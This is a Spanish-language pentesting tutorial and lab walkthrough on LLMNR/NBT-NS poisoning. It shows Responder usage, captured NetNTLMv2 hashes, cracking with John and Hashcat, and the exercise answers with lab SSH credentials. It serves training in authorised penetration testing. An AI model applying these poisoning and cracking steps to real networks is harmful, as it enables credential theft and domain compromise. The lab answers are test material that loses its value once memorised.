
# LLMNR/NBT-NS Poisoning - Desde Linux

En este punto, hemos completado nuestra enumeración inicial del dominio. Obtuvimos información básica de usuarios y grupos, enumeramos hosts mientras buscábamos servicios y roles críticos, como un controlador de dominio, y descubrimos algunos detalles, como el esquema de nombres utilizado para el dominio. En esta fase, trabajaremos con dos técnicas diferentes en paralelo: <mark style="color:purple;">`envenenamiento de red`</mark> y <mark style="color:purple;">`pulverización de contraseñas`</mark>. Realizaremos estas acciones con el objetivo de adquirir credenciales de texto sin cifrar válidas para una cuenta de usuario de dominio, lo que nos otorgará un punto de apoyo en el dominio para comenzar la siguiente fase de enumeración desde un punto de vista de credenciales.

Esta sección y la siguiente cubrirán una forma común de recopilar credenciales y ganar un punto de apoyo inicial durante una evaluación: un ataque Man-in-the-Middle a la resolución de nombres de multidifusión local de enlace (LLMNR) y al servicio de nombres NetBIOS (NBT-NS). transmisiones. Dependiendo de la red, este ataque puede proporcionar hashes de contraseñas de nivel administrativo o con privilegios bajos que se pueden descifrar sin conexión o incluso credenciales de texto sin cifrar. Aunque no se tratan en este módulo, estos hashes también se pueden usar a veces para realizar un ataque de retransmisión SMB para autenticarse en un host o en varios hosts del dominio con privilegios administrativos sin tener que descifrar el hash de contraseña fuera de línea. ¡Vamos a sumergirnos!

***

## <mark style="color:purple;">LLMNR y NBT-NS</mark>

[La resolución de nombres de multidifusión local de enlace](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) y [el servicio de nombres NetBIOS](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\(v=technet.10\)?redirectedfrom=MSDN) (NBT-NS) son componentes de Microsoft Windows que sirven como métodos alternativos de identificación de host que se pueden utilizar cuando falla el DNS. Si una máquina intenta resolver un host pero la resolución de DNS falla, normalmente la máquina intentará solicitar a todas las demás máquinas de la red local la dirección de host correcta a través de LLMNR. LLMNR se basa en el formato del Sistema de nombres de dominio (DNS) y permite a los hosts en el mismo enlace local realizar la resolución de nombres para otros hosts. Utiliza el puerto `5355` sobre UDP de forma nativa. Si LLMNR falla, se utilizará NBT-NS. NBT-NS identifica los sistemas en una red local por su nombre NetBIOS. NBT-NS utiliza el puerto `137` sobre UDP.

El truco aquí es que cuando se utilizan LLMNR/NBT-NS para la resolución de nombres, CUALQUIER host de la red puede responder. Aquí es donde entramos nosotros para `Responder`envenenar estas solicitudes. Con el acceso a la red, podemos falsificar una fuente autorizada de resolución de nombres (en este caso, un host que se supone pertenece al segmento de red) en el dominio de transmisión respondiendo al tráfico LLMNR y NBT-NS como si tuvieran una respuesta para la solicitud. anfitrión. Este esfuerzo de envenenamiento se realiza para lograr que las víctimas se comuniquen con nuestro sistema pretendiendo que nuestro sistema fraudulento conoce la ubicación del host solicitado.&#x20;

Si el host solicitado requiere resolución de nombre o acciones de autenticación, podemos capturar el hash NetNTLM y someterlo a un ataque de fuerza bruta fuera de línea en un intento de recuperar la contraseña en texto sin cifrar. La solicitud de autenticación capturada también puede retransmitirse para acceder a otro host o usarse contra un protocolo diferente (como LDAP) en el mismo host. La suplantación de identidad de LLMNR/NBNS combinada con la falta de firma SMB a menudo puede conducir al acceso administrativo en los hosts dentro de un dominio. Los ataques de retransmisión SMB se tratarán en un módulo posterior sobre movimiento lateral.

***

### Ejemplo rápido: LLMNR/NBT-NS Poisoning

1. Un host intenta conectarse al servidor de impresión en `\\print01.inlanefreight.local`, pero accidentalmente escribe \\`\printer01.inlanefreight.local`.
2. El servidor DNS responde indicando que este host es desconocido.
3. Luego, el host transmite a toda la red local preguntando si alguien conoce la ubicación de `\\printer01.inlanefreight.local`.
4. El atacante (nosotros con `Responder` en ejecución) responde al host indicando que es el `\\printer01.inlanefreight.local` lo que el host está buscando.
5. El host cree en esta respuesta y envía una solicitud de autenticación al atacante con un `nombre de usuario` y un `hash de contraseña NTLMv2`.
6. Este hash puede luego crackearse offline o usarse en un ataque de SMB Relay si existen las condiciones adecuadas.

***

### TTP

Estamos realizando estas acciones para recopilar información de autenticación enviada a través de la red en forma de hashes de contraseña NTLMv1 y NTLMv2, que son protocolos de autenticación que utilizan el hash LM o NT. Luego tomaremos el hash e intentaremos crackearlos offline usando herramientas como [Hashcat](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/cracking-de-contrasenas.md) o [John](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/cracking-de-contrasenas.md) con el objetivo de obtener la contraseña de texto sin cifrar de la cuenta para usarla para ganar un punto de apoyo inicial o expandir nuestro acceso dentro del dominio si capturamos un hash de contraseña para una cuenta con más privilegios que una cuenta que poseemos actualmente.

Se pueden utilizar varias herramientas para intentar el envenenamiento con LLMNR y NBT-NS:

<table data-header-hidden><thead><tr><th width="170"></th><th></th></tr></thead><tbody><tr><td><strong>Herramienta</strong></td><td><strong>Descripción</strong></td></tr><tr><td><a href="https://github.com/lgandx/Responder">Responder</a></td><td>Responder es una herramienta diseñada específicamente para envenenar LLMNR, NBT-NS y MDNS, con muchas funciones diferentes.</td></tr><tr><td><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></td><td>Inveigh es una plataforma MITM multiplataforma que se puede utilizar para ataques de suplantación de identidad y envenenamiento.</td></tr><tr><td><a href="https://www.metasploit.com/">Metasploit</a></td><td>Metasploit tiene varios escáneres integrados y módulos de suplantación de identidad diseñados para hacer frente a ataques de envenenamiento.</td></tr></tbody></table>

En esta sección y en la siguiente se mostrarán ejemplos de cómo usar Responder e Inveigh para capturar hashes de contraseñas e intentar crackearlos sin conexión. Normalmente, iniciamos una prueba de penetración interna desde una posición anónima en la red interna del cliente con un host de ataque Linux.&#x20;

Herramientas como Responder son excelentes para establecer un Foothold que luego podemos expandir a través de más enumeraciones y ataques. Responder está escrito en Python y normalmente se usa en un host de ataque Linux, aunque existe una versión .exe que funciona en Windows. Inveigh está escrito tanto en C# como en PowerShell (considerado heredado). Ambas herramientas se pueden usar para atacar los siguientes protocolos:

* `LLMNR`
* `DNS`
* `MDNS`
* `NBNS`
* `DHCP`
* `ICMP`
* `HTTP`
* `HTTPS`
* `PYME`
* `LDAP`
* `WebDAV`
* `Autenticación de proxy`

Responder también tiene soporte para:

* `MSSQL`
* `DCE-RPC`
* `Autenticación FTP, POP3, IMAP y SMTP`

***

### Responder en acción

Responder es una herramienta relativamente sencilla, pero extremadamente poderosa y tiene muchas funciones diferentes. En la sección anterior de [`Enumeración en AD`](/ethical-hacking-cheatsheet/active-directory/active-directory/enumeracion-en-ad.md), utilizamos Responder en modo Análisis (pasivo). Esto significa que escuchó cualquier solicitud de resolución, pero no las respondió ni envió paquetes envenenados. Estábamos actuando como una mosca en la pared, simplemente escuchando. Ahora, iremos un paso más allá y dejaremos que Responder haga lo que mejor sabe hacer. Veamos algunas opciones disponibles escribiendo `responder -h` en nuestra consola.

```shell-session
afsh4ck@kali]$ responder -h
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -r -f
or:
responder -I eth0 -wrf

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined with
                        -r. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.
```

Como se mostró anteriormente en el módulo, el indicador `-A` nos pone en modo de análisis, lo que nos permite ver las solicitudes NBT-NS, BROWSER y LLMNR en el entorno sin envenenar ninguna respuesta. Siempre debemos proporcionar una interfaz o una IP. Algunas opciones comunes que normalmente querremos usar son `-wf`; esto iniciará el servidor proxy falso WPAD, mientras `-f` intentará tomar huellas digitales del sistema operativo y la versión del host remoto. Podemos usar la opción `-v` para aumentar el verbose, pero esto generará una gran cantidad de datos adicionales impresos en la consola.&#x20;

Otras opciones, como `-F` y `-P` se pueden utilizar para forzar la autenticación NTLM o básica y forzar la autenticación de proxy, pero pueden provocar un mensaje de inicio de sesión, por lo que deben usarse con moderación. El uso de la opción `-w` utiliza el servidor proxy WPAD integrado. Esto puede ser muy efectivo, especialmente en organizaciones grandes, porque capturará todas las solicitudes HTTP de cualquier usuario que inicie Internet Explorer si el navegador tiene habilitada [la configuración de detección automática](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) .

Con esta configuración que se muestra arriba, Responder escuchará y responderá cualquier solicitud que vea en el cable. Si tiene éxito y logra capturar un hash, Responder lo imprimirá en la pantalla y lo escribirá en un archivo de registro por host ubicado en el directorio `/usr/share/responder/logs`. Los hashes se guardan en el formato `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt` y un hash se imprime en la consola y se almacena en su archivo de registro asociado, a menos que el modo verbose (`-v`) esté habilitado.&#x20;

Por ejemplo, un archivo de registro puede tener el aspecto `SMB-NTLMv2-SSP-172.16.5.25`. Los hashes también se almacenan en una base de datos SQLite que se puede configurar en el archivo de configuración `Responder.conf`, que normalmente se encuentra en, `/usr/share/responder` a menos que clonemos el repositorio de Responder directamente desde GitHub.

Debemos ejecutar la herramienta con privilegios sudo o como root y asegurarnos de que los siguientes puertos estén disponibles en nuestro host de ataque para que funcione mejor:

```shell-session

UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

Cualquiera de los servidores no autorizados (es decir, SMB) se puede desactivar en el archivo `Responder.conf`.

#### **Registros de respuesta**

```shell-session
afsh4ck@kali$ ls

Analyzer-Session.log                Responder-Session.log
Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
HTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt
Poisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt
Proxy-Auth-NTLMv2-172.16.5.200.txt
```

Si Responder capturó con éxito los hashes, como se vio arriba, podemos encontrar los hashes asociados con cada host/protocolo en su propio archivo de texto. La siguiente animación nos muestra un ejemplo de Responder ejecutando y capturando hashes en la red.

### **Iniciar Responder con la configuración predeterminada**

```bash
sudo responder -I ens224 
```

![imagen](https://academy.hackthebox.com/storage/modules/143/responder_hashes.png)

Normalmente deberíamos iniciar Responder y dejarlo ejecutar por un tiempo en una ventana tmux mientras realizamos otras tareas de enumeración para maximizar la cantidad de hashes que podemos obtener. Una vez que estemos listos, podemos pasar estos hashes a Hashcat usando el modo hash `5600` para hashes NTLMv2 que normalmente obtenemos con Responder.&#x20;

En ocasiones, podemos obtener hashes NTLMv1 y otros tipos de hashes y podemos consultar la página [de hashes de ejemplo de Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) para identificarlos y encontrar el modo hash adecuado. Si alguna vez obtenemos un hash extraño o desconocido, este sitio es una gran referencia para ayudar a identificarlo. Consulta el módulo [Cracking de contraseñas](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/cracking-de-contrasenas.md) para obtener un estudio en profundidad de los distintos modos de Hashcat y cómo atacar una amplia variedad de tipos de hash.

Una vez que tengamos suficiente, necesitamos obtener estos hashes en un formato utilizable para nosotros ahora mismo. Los hashes NetNTLMv2 son muy útiles una vez descifrados, pero no se pueden utilizar para técnicas como pass-the-hash, lo que significa que tenemos que intentar descifrarlos sin conexión. Podemos hacer esto con herramientas como Hashcat y John.

### Crackear un hash NTLMv2 con John

```shell-session
afsh4ck@kali$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
E4syPa$$w0Rd89       (it-admin)     
1g 0:00:00:05 DONE (2024-06-25 17:27) 0.1968g/s 1522Kp/s 1522Kc/s 1522KC/s h4x0r55ucK..h100d
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

### **Crackear un hash NTLMv2 con Hashcat**

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000
Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
Time.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10967040/14344385 (76.46%)
Rejected.........: 0/10967040 (0.00%)
Restore.Point....: 10960896/14344385 (76.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: L0VEABLE -> Kittikat

Started: Mon Feb 28 15:20:29 2022
Stopped: Mon Feb 28 15:20:42 2022
```

{% endcode %}

Al observar los resultados anteriores, podemos ver que desciframos el hash NET-NTLMv2 para el usuario `FOREND`, cuya contraseña es `Klmcargo2`. Por suerte para nosotros, nuestro dominio de destino permite contraseñas débiles de 8 caracteres. Este tipo de hash puede ser "lento" de descifrar incluso en una plataforma de descifrado de GPU, por lo que las contraseñas grandes y complejas pueden ser más difíciles o imposibles de descifrar en un período de tiempo razonable.

***

## <mark style="color:purple;">Caso Práctico</mark>

```
SSH a 10.129.237.137 (ACADEMIA-EA-ATTACK01)
Usuario " htb-student " 
Contraseña " HTB_@cademy_stdnt! "
```

### Pregunta 1

Ejecute Responder y obtenga un hash para una cuenta de usuario que comience con la letra `b`. Envíe el nombre de la cuenta como respuesta.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo responder -I ens224 
```

<figure><img src="/files/RLORhoI7aFj0ZA5dhe3p" alt=""><figcaption></figcaption></figure>

{% code title="NT Hash" overflow="wrap" %}

```
backupagent::INLANEFREIGHT:6eb68e9b5088a36a:D24FDF869FC1C6472B6A3DA43D861153:010100000000000080983B71F1C6DA01CD96B4BCC45625BF00000000020008005200440032004A0001001E00570049004E002D0030003000300038004D0030004B004500460043004A0004003400570049004E002D0030003000300038004D0030004B004500460043004A002E005200440032004A002E004C004F00430041004C00030014005200440032004A002E004C004F00430041004C00050014005200440032004A002E004C004F00430041004C000700080080983B71F1C6DA01060004000200000008003000300000000000000000000000003000001360500E69C61A4CB33FAA952AB2670F72B8C221E1AA5A6E309786BFFD8588CA0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

{% endcode %}

### Pregunta 2

Descifre el hash de la cuenta anterior y envíe la contraseña en texto sin cifrar como respuesta.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash_back 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
h1backup55       (backupagent)     
1g 0:00:00:05 DONE (2024-06-25 17:27) 0.1968g/s 1522Kp/s 1522Kc/s 1522KC/s h4x0r55ucK..h100d
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

### Pregunta 3

Ejecute Responder y obtenga un hash NTLMv2 para el usuario `wley`. Descifra el hash usando Hashcat y envía la contraseña del usuario como respuesta.

<figure><img src="/files/C2ZJUhvxxQHdzoYVJyBN" alt=""><figcaption></figcaption></figure>

{% code title="NT Hash" overflow="wrap" %}

```
wley::INLANEFREIGHT:26726256f86409d9:91D67447FD3D9942125356458324F1A8:010100000000000080983B71F1C6DA01E72E09FC538A483A00000000020008005200440032004A0001001E00570049004E002D0030003000300038004D0030004B004500460043004A0004003400570049004E002D0030003000300038004D0030004B004500460043004A002E005200440032004A002E004C004F00430041004C00030014005200440032004A002E004C004F00430041004C00050014005200440032004A002E004C004F00430041004C000700080080983B71F1C6DA01060004000200000008003000300000000000000000000000003000001360500E69C61A4CB33FAA952AB2670F72B8C221E1AA5A6E309786BFFD8588CA0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

{% endcode %}

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash_wley 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
transporter@4    (wley)     
1g 0:00:00:01 DONE (2024-06-25 17:28) 0.5405g/s 1678Kp/s 1678Kc/s 1678KC/s trapperstrail..tqmabuelita2
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

***

## <mark style="color:purple;">Hacia delante</mark>

En este punto de nuestra evaluación, hemos obtenido y descifrado un hash NetNTLMv2 para el usuario `FOREND`. Podemos utilizar esto como punto de apoyo en el dominio para comenzar una mayor enumeración. Es mejor recopilar tantos datos como sea posible durante una evaluación, por lo que debemos intentar descifrar tantos hashes como podamos (siempre que nuestra enumeración posterior muestre el valor de descifrarlos para mejorar nuestro acceso). No queremos perder un valioso tiempo de evaluación intentando descifrar hashes para usuarios que no nos ayudarán a avanzar hacia nuestro objetivo. Antes de pasar a otras formas de obtener un punto de apoyo mediante la pulverización de contraseñas, veamos un método similar para obtener hashes de un host de Windows utilizando la herramienta Inveigh.
